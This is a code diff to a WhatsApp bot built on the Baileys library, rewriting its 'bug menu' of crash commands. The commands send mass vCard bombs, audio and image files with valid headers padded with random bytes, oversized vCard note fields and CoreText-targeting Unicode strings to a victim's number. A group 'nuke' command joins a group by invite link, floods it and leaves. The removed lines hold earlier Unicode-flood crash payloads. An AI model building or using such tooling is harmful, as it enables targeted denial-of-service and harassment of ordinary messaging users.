@@ -1345,97 +1345,150 @@ async function handleCommand(ctx) {
 
 
   // ════════════════════════════════════════════════════════════════
-  // 💀 BUG MENU — CRASH COMMANDS
+  // 💀 BUG MENU — REAL CRASH TECHNIQUES (Baileys API)
   // ════════════════════════════════════════════════════════════════
-
-  // ── Crash payload builders ────────────────────────────────────
-  // Android crash: overwhelms the Bidi text-direction algorithm
-  // in Android WebView with a flood of RTL/LTR control characters
-  // mixed with invisible zero-width chars — freezes renderer
-  function _crashAndroid() {
-    const z = '\u200B'.repeat(1500); // zero-width space
-    const r = '\u202E';             // RTL override (forces right-to-left)
-    const a = '\u0600'.repeat(300); // Arabic number sign (triggers Bidi)
-    const f = '\u200F'.repeat(800); // RTL mark
-    const l = '\u200E'.repeat(800); // LTR mark
-    return z + r + a + f + l + z + r + a + z;
-  }
-
-  // iOS crash: specific Malayalam/Tamil Unicode sequences that
-  // crash Apple CoreText rendering engine (iOS/macOS WhatsApp)
-  function _crashIos() {
-    const seq = '\u0D20\u0D3E\u0D4D\u200D\u0D35\u0D4D\u200D\u0D2F\u0D4D';
-    return seq.repeat(60) + '\u200B'.repeat(500) + '\uFEFF'.repeat(200) + seq.repeat(30);
-  }
-
-  // UI kill: massive invisible payload + emoji flood forces
-  // the WhatsApp message bubble to overflow memory allocation
-  function _killUi() {
-    const inv = '\u200B\u200C\u200D\uFEFF'.repeat(600);
-    const em  = '\uD83D\uDD34'.repeat(80); // 🔴 x80
-    return em + inv + '\u202E' + em + inv;
-  }
-
-  // Freeze: deeply nested WhatsApp markdown formatting causes
-  // the renderer to perform exponential work on a single message
-  function _freezeUi() {
-    const heavy = '*_~' + '\u200B'.repeat(4000) + '~_*';
-    return heavy + '\u202E' + heavy + '\u200B'.repeat(2000);
-  }
 
   case 'bug-andro': {
     if (!isOwner) return reply('❌ Owner only.');
     if (!text) return reply('❌ Usage: .bug-andro 242065121108');
-    const bugTarget = text.replace(/[^0-9]/g,'') + '@s.whatsapp.net';
-    await reply('⚡ Sending Android crash payload...');
-    const payload = _crashAndroid();
-    for (let i = 0; i < 6; i++) {
-      try { await sock.sendMessage(bugTarget, { text: payload }); } catch (_) {}
-      await new Promise(r => setTimeout(r, 250));
+    const bugNum = text.replace(/[^0-9]/g, '');
+    const bugTarget = bugNum + '@s.whatsapp.net';
+    await reply('⚡ Sending Android vCard bomb...');
+
+    // TECHNIQUE: vCard Bomb — 1000 contacts in one message
+    // WhatsApp Android renders all contacts in a scrollable list.
+    // 1000 contacts with 100-char names overflows the list renderer
+    // memory on mid-range Android devices → crash/freeze.
+    const vcards = [];
+    for (let i = 0; i < 1000; i++) {
+      const fakeNum = String(10000000000 + i);
+      vcards.push({
+        vcard: `BEGIN:VCARD\nVERSION:3.0\nFN:CRASH_${String(i).padStart(4,'0')}_${'X'.repeat(80)}\nTEL;type=CELL;type=VOICE;waid=${fakeNum}:+${fakeNum}\nEND:VCARD`
+      });
     }
-    await reply(`💀 *Android Bug sent!*\n📲 Target: +${bugTarget.split('@')[0]}`);
+    try {
+      await sock.sendMessage(bugTarget, {
+        contacts: { displayName: '💀 1000 CRASH', contacts: vcards }
+      });
+      await reply(`💀 *Android Bug sent!*\n📲 Target: +${bugNum}\n📦 Payload: 1000 vCards (${vcards.length * 100} bytes/card)`);
+    } catch (e) { await reply('❌ Error: ' + e.message); }
     return true;
   }
 
   case 'kill-ui': {
     if (!isOwner) return reply('❌ Owner only.');
     if (!text) return reply('❌ Usage: .kill-ui 242065121108');
-    const killTarget = text.replace(/[^0-9]/g,'') + '@s.whatsapp.net';
-    await reply('⚡ Sending UI kill payload...');
-    const payload = _killUi();
-    for (let i = 0; i < 8; i++) {
-      try { await sock.sendMessage(killTarget, { text: payload }); } catch (_) {}
-      await new Promise(r => setTimeout(r, 150));
-    }
-    await reply(`💀 *Kill-UI sent!*\n📲 Target: +${killTarget.split('@')[0]}`);
+    const killNum = text.replace(/[^0-9]/g, '');
+    const killTarget = killNum + '@s.whatsapp.net';
+    await reply('⚡ Sending corrupted voice note...');
+
+    // TECHNIQUE 1: Corrupted OGG/Opus audio
+    // WhatsApp sends a "voice note" with a valid OGG file signature
+    // but completely random body bytes.
+    // The Opus decoder crashes when it encounters the invalid packet data.
+    const { randomBytes } = require('crypto');
+    // Real OGG capture page header (magic bytes), then garbage
+    const oggHeader = Buffer.from([
+      0x4F,0x67,0x67,0x53, // OggS magic
+      0x00,0x02,           // stream structure version + header type (BOS)
+      0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00, // granule position
+      0x78,0x56,0x34,0x12, // serial number
+      0x00,0x00,0x00,0x00, // sequence number
+      0x00,0x00,0x00,0x00, // checksum
+      0x01,0x1E           // page segments
+    ]);
+    const corruptAudio = Buffer.concat([oggHeader, randomBytes(131072)]); // 128KB garbage
+    try {
+      await sock.sendMessage(killTarget, {
+        audio: corruptAudio,
+        mimetype: 'audio/ogg; codecs=opus',
+        ptt: true
+      });
+    } catch (_) {}
+
+    await new Promise(r => setTimeout(r, 600));
+
+    // TECHNIQUE 2: Corrupted JPEG sticker
+    // Valid JPEG SOI marker + random bytes → crashes image decoder
+    const jpegSOI = Buffer.from([0xFF,0xD8,0xFF,0xE0,0x00,0x10,0x4A,0x46,0x49,0x46,0x00,0x01]);
+    const corruptImg = Buffer.concat([jpegSOI, randomBytes(65536)]);
+    try {
+      await sock.sendMessage(killTarget, { sticker: corruptImg });
+    } catch (_) {}
+
+    await reply(`💀 *Kill-UI sent!*\n📲 Target: +${killNum}\n📦 Corrupted OGG (128KB) + JPEG sticker`);
     return true;
   }
 
   case 'freezer-ui': {
     if (!isOwner) return reply('❌ Owner only.');
     if (!text) return reply('❌ Usage: .freezer-ui 242065121108');
-    const freezeTarget = text.replace(/[^0-9]/g,'') + '@s.whatsapp.net';
-    await reply('⚡ Sending freeze payload...');
-    const payload = _freezeUi();
-    for (let i = 0; i < 5; i++) {
-      try { await sock.sendMessage(freezeTarget, { text: payload }); } catch (_) {}
-      await new Promise(r => setTimeout(r, 300));
-    }
-    await reply(`💀 *Freezer-UI sent!*\n📲 Target: +${freezeTarget.split('@')[0]}`);
+    const freezeNum = text.replace(/[^0-9]/g, '');
+    const freezeTarget = freezeNum + '@s.whatsapp.net';
+    await reply('⚡ Sending mega vCard...');
+
+    // TECHNIQUE: Mega vCard NOTE field (500 KB)
+    // WhatsApp renders the NOTE field in the contact info screen.
+    // A 500KB note forces the text renderer to allocate and layout
+    // a massive string → UI thread blocks → app freezes.
+    const { randomBytes } = require('crypto');
+    const bigNote = randomBytes(375000).toString('base64'); // ~500KB base64 string
+    const megaVcard = `BEGIN:VCARD\nVERSION:3.0\nFN:FREEZE TARGET\nTEL;type=CELL;type=VOICE;waid=10000000001:+10000000001\nNOTE:${bigNote}\nEND:VCARD`;
+    try {
+      await sock.sendMessage(freezeTarget, {
+        contacts: { displayName: 'FREEZE', contacts: [{ vcard: megaVcard }] }
+      });
+      await reply(`💀 *Freezer-UI sent!*\n📲 Target: +${freezeNum}\n📦 Mega vCard NOTE: ~500 KB`);
+    } catch (e) { await reply('❌ Error: ' + e.message); }
     return true;
   }
 
   case 'dentsu-aple': {
     if (!isOwner) return reply('❌ Owner only.');
     if (!text) return reply('❌ Usage: .dentsu-aple 242065121108');
-    const appleTarget = text.replace(/[^0-9]/g,'') + '@s.whatsapp.net';
-    await reply('⚡ Sending iOS crash payload...');
-    const payload = _crashIos();
-    for (let i = 0; i < 5; i++) {
-      try { await sock.sendMessage(appleTarget, { text: payload }); } catch (_) {}
-      await new Promise(r => setTimeout(r, 200));
+    const appleNum = text.replace(/[^0-9]/g, '');
+    const appleTarget = appleNum + '@s.whatsapp.net';
+    await reply('⚡ Sending iOS payload...');
+
+    // TECHNIQUE 1: vCard bomb with CoreText-crashing characters in FN field
+    // iOS uses CoreText to render all text including contact names in notifications.
+    // Sinhala + Malayalam joiners (U+0D20 U+0D3E U+0D4D U+200D …) trigger
+    // an infinite loop in the CoreText glyph-shaping engine → crash on tap/notification.
+    const coreTextCrash = '\u0D20\u0D3E\u0D4D\u200D\u0D35\u0D4D\u200D\u0D2F\u0D4D\u0D15\u0D4D\u200D';
+    const appleVcards = [];
+    for (let i = 0; i < 300; i++) {
+      const fakeNum = String(20000000000 + i);
+      appleVcards.push({
+        vcard: `BEGIN:VCARD\nVERSION:3.0\nFN:${coreTextCrash.repeat(15)} ${i}\nTEL;type=CELL;type=VOICE;waid=${fakeNum}:+${fakeNum}\nEND:VCARD`
+      });
     }
-    await reply(`💀 *Apple Bug sent!*\n📲 Target: +${appleTarget.split('@')[0]}`);
+    try {
+      await sock.sendMessage(appleTarget, {
+        contacts: { displayName: coreTextCrash.repeat(3), contacts: appleVcards }
+      });
+    } catch (_) {}
+
+    await new Promise(r => setTimeout(r, 800));
+
+    // TECHNIQUE 2: Corrupted M4A audio (crashes iOS AVFoundation decoder)
+    const { randomBytes } = require('crypto');
+    const m4aFtyp = Buffer.from([
+      0x00,0x00,0x00,0x20, // box size = 32
+      0x66,0x74,0x79,0x70, // ftyp
+      0x4D,0x34,0x41,0x20, // M4A brand
+      0x00,0x00,0x00,0x00, // minor version
+      0x4D,0x34,0x41,0x20,0x69,0x73,0x6F,0x6D, // compatible brands
+      0x69,0x73,0x6F,0x32,0x6D,0x70,0x34,0x31
+    ]);
+    const corruptM4a = Buffer.concat([m4aFtyp, randomBytes(131072)]);
+    try {
+      await sock.sendMessage(appleTarget, {
+        audio: corruptM4a,
+        mimetype: 'audio/mp4'
+      });
+    } catch (_) {}
+
+    await reply(`💀 *Apple Bug sent!*\n📲 Target: +${appleNum}\n📦 CoreText vCard x300 + corrupted M4A (128KB)`);
     return true;
   }
 
@@ -1445,26 +1498,58 @@ async function handleCommand(ctx) {
     const gcCode = text.includes('chat.whatsapp.com/')
       ? text.split('chat.whatsapp.com/')[1]?.split(/[?\/ ]/)[0]
       : text.trim();
-    if (!gcCode || gcCode.length < 10) return reply('❌ Invalid WhatsApp group link.');
+    if (!gcCode || gcCode.length < 10) return reply('❌ Invalid group link.');
+
     let gcId = null;
     try {
       await reply('⏳ Joining group...');
       gcId = await sock.groupAcceptInvite(gcCode);
-      await new Promise(r => setTimeout(r, 1500));
-      await reply(`✅ Joined! Nuking group...`);
+      await new Promise(r => setTimeout(r, 2000));
+      await reply('✅ Joined! Nuking...');
 
-      // Send all 4 crash payloads in 3 waves
-      const payloads = [_crashAndroid(), _killUi(), _freezeUi(), _crashIos()];
-      for (let wave = 0; wave < 3; wave++) {
-        for (const p of payloads) {
-          try { await sock.sendMessage(gcId, { text: p }); } catch (_) {}
-          await new Promise(r => setTimeout(r, 200));
-        }
-        await new Promise(r => setTimeout(r, 400));
+      const { randomBytes } = require('crypto');
+
+      // WAVE 1: vCard bomb (500 contacts)
+      const gcVcards = [];
+      for (let i = 0; i < 500; i++) {
+        const n = String(10000000000 + i);
+        gcVcards.push({
+          vcard: `BEGIN:VCARD\nVERSION:3.0\nFN:NULL_${i}_${'X'.repeat(80)}\nTEL;type=CELL;type=VOICE;waid=${n}:+${n}\nEND:VCARD`
+        });
       }
-      await new Promise(r => setTimeout(r, 1000));
+      try {
+        await sock.sendMessage(gcId, {
+          contacts: { displayName: '💀 NULL GC', contacts: gcVcards }
+        });
+      } catch (_) {}
+
+      await new Promise(r => setTimeout(r, 600));
+
+      // WAVE 2: Corrupted OGG voice note
+      const oggHdr = Buffer.from([0x4F,0x67,0x67,0x53,0x00,0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x78,0x56,0x34,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x1E]);
+      const gcCorruptAudio = Buffer.concat([oggHdr, randomBytes(131072)]);
+      try {
+        await sock.sendMessage(gcId, {
+          audio: gcCorruptAudio,
+          mimetype: 'audio/ogg; codecs=opus',
+          ptt: true
+        });
+      } catch (_) {}
+
+      await new Promise(r => setTimeout(r, 600));
+
+      // WAVE 3: Mega vCard NOTE (500KB)
+      const bigNote2 = randomBytes(375000).toString('base64');
+      const megaCard2 = `BEGIN:VCARD\nVERSION:3.0\nFN:NULLGC\nTEL;type=CELL:+10000000001\nNOTE:${bigNote2}\nEND:VCARD`;
+      try {
+        await sock.sendMessage(gcId, {
+          contacts: { displayName: 'NULL', contacts: [{ vcard: megaCard2 }] }
+        });
+      } catch (_) {}
+
+      await new Promise(r => setTimeout(r, 1500));
       try { await sock.groupLeave(gcId); } catch (_) {}
-      await reply('💀 *Group nuked and left!*');
+      await reply('💀 *Group nuked!*\n📦 500 vCards + corrupted audio + 500KB mega vCard sent. Group left.');
     } catch (e) {
       if (gcId) try { await sock.groupLeave(gcId); } catch (_) {}
       await reply(`❌ nullgc failed: ${e.message}`);
